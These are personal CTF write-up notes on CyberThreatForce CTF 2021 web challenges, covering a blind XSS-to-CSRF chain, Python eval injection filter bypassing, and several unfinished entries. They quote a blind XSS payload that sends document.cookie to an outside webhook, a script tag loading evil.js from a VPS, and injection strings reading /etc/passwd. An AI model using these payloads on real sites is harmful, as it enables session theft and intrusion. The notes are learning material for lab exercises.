
# CyberThreatForce CTF 2021

## Web Challs

### Raas_Recruitment
- [ ] Was Solved By Me
#### Points - 180 -> 410
#### Description:
We found the **APT403** recruitment site.
Tried to find a way to exploit their website !

**[](https://recruitment.cyberthreatforce-ctf.com/)**


#### Write-Up - MY OWN
 When entering the Website. We're welcomed with
![](https://i.imgur.com/kMjLk9v.png)
After registration We get a message that the  review team will review the application
![](https://i.imgur.com/qTFY32g.png)
- The site also uses `Content-Disposition: multipart/form-data;`, which is interesting 

- The webpage uses newest Apache, so no exploits for CVEs
![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/2.png)
- **There was Hint Given By Administrators** - **It's not SQLi, try different Injection ^^**
	- Not very useful Hint to be honest




#### Notes After The Competition - NOT MY OWN SOLUTION
##### Finding the XSS and Exploiting It
- There actually was a SQL Injection, which was not planned by the authors
- The vulnerability was indeed in `Content-Disposition multipart body`
	- W0rty tried injecting -   `">'>< script>fetch("[https://webhook.site/670142c2-94c0-4669-a9ce-6539d860ce4c/?c="+document.cookie](https://webhook.site/670142c2-94c0-4669-a9ce-6539d860ce4c/?c=%22+document.cookie))< /script>`, which sends the request to his WebHook.
		- Testing XSS with Blind Payloads is way better then just executing `alert()`, because most web pages sanitizes or filters out it. Amazing!
		![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/3.png)
		- The last parameter `name=radio` triggered the XSS payload.
	- W0rty tried to leak /admin/index.php source code with this Blind XSS with the following script
	- ![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/4.png)
		- But the website was limiting the size of his payload
			- He then put the payload into his VPS, and with this payload ->   `">'>< script src="https://midnightflag.fr/evil.js">< /script>` he invoked this code
				- This though didn't work either. It seemed like the index.php source code that he wanted to extract was too big, so he then used `substr` function to select part of the HTML page:
				-  ![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/5.png)
					-  This time it succeeded, and he found out from the source code, that the page has a hidden web-page, called `/bingvxyyaknprxtgwexgldwdcrcqrfacDEV/`

##### Analyzing Hidden Page
- After W0rty read the HTML, he noticed weird javascript endpoint called `prcmSDAui9SeXxbuuaUKjEAJ5qIGY9B9vPFMwW19.js`
	-  This JavaScript was obfuscated. After the obfuscation, it seems like it's about the creation of "Dev" user account
		-  **Keep in mind, that only an admin could create a user account, and so W0rty had to perform CSRF Attack, through XSS Injection **
			- SOURCE CODE PROVIDED FOR THE 'BOT' IS ON THE AUTHOR'S ORIGINAL WRITE-UP
				- The first implementation of the bot didn't work, and so he W0rty tried to implement the CSRF in `multipart/form-data`, just like we saw at the 'Contact Form' in the beginning
					- SOURCE CODE PROVIDED FOR THE 'BOT' IS ON THE AUTHOR'S ORIGINAL WRITE-UP
						- **This worked and W0rty received an attack**. 
	
- There were so much in this challenge. It is interesting that initially the Challenge was rated for 180 points(the easiest challenge), and later to 410 points. Maybe authors made it more complicated?
- Compared to me, W0rax did an amazing job!

##### Lessons taken:
- Test XSS with Blind Payloads
- Have an ability to host your payloads on your own VPS
- Check which type of data the WebApp accepts when building your payload
- And a lot more, related to just W0rty Backend Web Programming Skills!
					
##### References:
[W0rty Write-Up](https://github.com/W0rty/WU-CyberThreatForce/blob/main/README-EN.md)

---------------------------------------------------------------------
### BotnetFlooder
- [ ] Was Solved By Me
#### Points -  200
#### Description:
Hello CTF-Agent,

We found a website, used by the APT-403, that, thanks to a botnet, executes ddos attacks on some targets.

Your mission will be to find a way in the web server.

H.Q

**Instance Pannel**

[http://144.217.73.235:8739](http://144.217.73.235:8739)

Ports bind:8739 =>80/tcp



#### Write-Up
![](https://i.imgur.com/SEbLFav.png)
- We need to insert a query, the translation of the Russian is "Choose your goal"
- When we submit a query (need to be integer/id), we see that it's a form to attack the Victim
	- Later We'll see, that this id represents actually ip address of the victim
	- ![](https://i.imgur.com/L8PeAqn.png)
	
![](https://i.imgur.com/3oWRuSF.png)

##### OS COMMAND INJECTION

- The website is probably taking the id, and then adding it to a shell command. This is great place for **OS Command Injection**
- When we execute `127.0.0.1;whoami` Query is filtered  and doesn't allow non-integer values. Giving us **invalid literal for int() with base 10: '1;whoami'** Error
	- ![](https://i.imgur.com/TKSZbUh.png)
	- Let's google this error and see what we can find! It's usually good to google the Error messages, to identify the framework, language used etc.
		- We get https://stackoverflow.com/questions/1841565/valueerror-invalid-literal-for-int-with-base-10 AND https://careerkarma.com/blog/python-valueerror-invalid-literal-for-int-with-base-10/
		- So the **website uses Python!**
- **The main Problem: Executing OS Injection using only Integers OR Escape conversion to float**
	- The Web Page is probably checking If the query is string or not
		- We pass this check with `127.0.0.1;whoami`.  It's just that query can't be parsed 
	- Tweaking did not give me any good, so **I setup fuzzing with OS Injection Payloads**
	- ![](https://i.imgur.com/4bK9X1p.png)
		- When examining the requests, **I saw additional Errors**:
			- `unexpected character after line continuation character (&lt;string&gt;, line 1)` for `127.0.0.1 whoami'|type %SYSTEMROOT%\win.ini`
			- `name &#39;cat&#39; is not defined` for `127.0.0.1 whoami'&cat /etc/passwd&'`
				- This one is interesting. It shows us that the 'parser' tries to get a variable of 'car'. It can indicate **that we successfully escaped the float parser with `127.0.0.1'&whoami&'`**
				- When executing `127.0.0.1'&eval(whoami)&'` I finally get some success
					- ![](https://i.imgur.com/93klsVd.png)
				- Now we need to **Bypass the Filter**
					- This again involves fuzzing. First I tried to fuzz the parameter in parenthesis `whoami`. This didn't give me anything, so **it's probably blocking eval**
					- Tried to determine what is Filtered and What is not.
						- Filters:
							- `eval()`
							- `import (...)`
							- `127.0.0.1'from module subprocess import subprocess.run('ls')'` - Gets filtered because of `import` keyword
						- Does Not Filter:
							- `print`
							- `subprocess.run('ls')`
								- This is the function that I'll try to use. **THE MISSION: IMPORT THIS MODULE WITHOUT USING THE IMPORT KEYWORD D:**
								- [Tutorial on subprocess module](https://www.youtube.com/watch?v=2Fp1N6dof0Y)
							- `127.0.0.1'from module subprocess subprocess.run('ls')'` - Doesn't get filtered because of lack of `import` keyword
							- When the page's not filtering, it outputs **error: ** `invalid syntax (<string>, line 1)`
			- **These payloads somehow doesn't produce error with query not being valid int/float, so it's good to examine it more.**
#### Notes After The Competition
- It seemed that there was a `flag.txt` that could be opened with `open('flag.txt').read()` function

##### Lessons to be taken:
- Always assume, that in the case of Web Challenges, the flag is always in the main/root directory of the website / the context in which the `index` file is located
##### References
- Psycholog1st
- ![[Pasted image 20210705184114.png]]
- ![[Pasted image 20210705184401.png]]

---------------------------------------------------------------------
### BitcoinMiner-Med
- [ ] Was Solved By Me
#### Points - 200
#### Description:
Hello CTF-Agent,

We found a site, used by the APT-403 to mine bitcoin on botnet's computers. This site seems to be using a strong encryption algorithm.

Your mission will be to get into the admin panel.

H.Q


#### Write-Up
![](https://i.imgur.com/LGCkJCr.png)
- The site asks us for Bitcoin Address and Password in a form
	-  Checks if the bitcoin address is in a valid form
	-  Using the site https://randommer.io/bitcoin-address-generator we can generate a fake one
		-  But even with a fake Bitcoin Wallet Address (`thLbPingAUrJcRyERuGZvpGdXX5FGV3RY`, get an error 'Invalid Bitcoin Adress'

- Let's try to find SQL Injection and dumb the database of the 'valid' bitcoin addresses AND passwords...
	- **Maybe later...**
- **From the Hint that was provided, there's algo directory, in there We've got:**
![](https://i.imgur.com/Hbx3mx6.png)
	- "Выберите свою цель " -> " Choose your goal "
		- Don't know if it relates to the challenge neccessarily,
	- The graph show the **XOR** decryption function via bruteforce with ciphertext and cleartext parameters
		- But where we can find these parameters to decypher them?
			- From the Hint we received, there might be other hidden directories/files on this webpage
#### Notes After The Competition

------------------------------------------------------------

### Forum403 
- [ ] Was Solved By Me
#### Points - 400
#### Description:
Agent of CyberThreatForce,

APT 403 has a forum where they sell their ransomware. Your mission is to pawn the admin account of the website in order to paralyze their income. You can access it there: [http://51.68.72.26/](http://51.68.72.26/) Please do not use the docker instance through CTFd for availability reasons.

Best of luck and may the hack be with you.

Headquarters of CyberThreatForce


#### Write-Up
- From the description, it seems We have to perform CSRF Attack
![](https://i.imgur.com/4hrpAYE.png)
- After trying basic SQL Injection... we get to inscription.php:
 ![](https://i.imgur.com/5pWH8iA.png)
- The first time I saw It I really got scared! xD
- I downloaded the `trollface.png` file	and performed basic steganography steps like extracting with binwalk, uncompressing with zlib-flate, but nothing :/ a dead end indeed
#### Notes After The Competition


----------------------------------------------------------------------
### Trojan Tools
- [ ] Was Solved By Me
#### Points - 75
#### Description:
We has find this tools in computer of script kiddies , you need to find the secret of this program.

[TROJAN_TOOLS.EXE EMBEDDED]()


#### Write-Up
- 

#### Notes After The Competition


----------------------------------------------------------------------

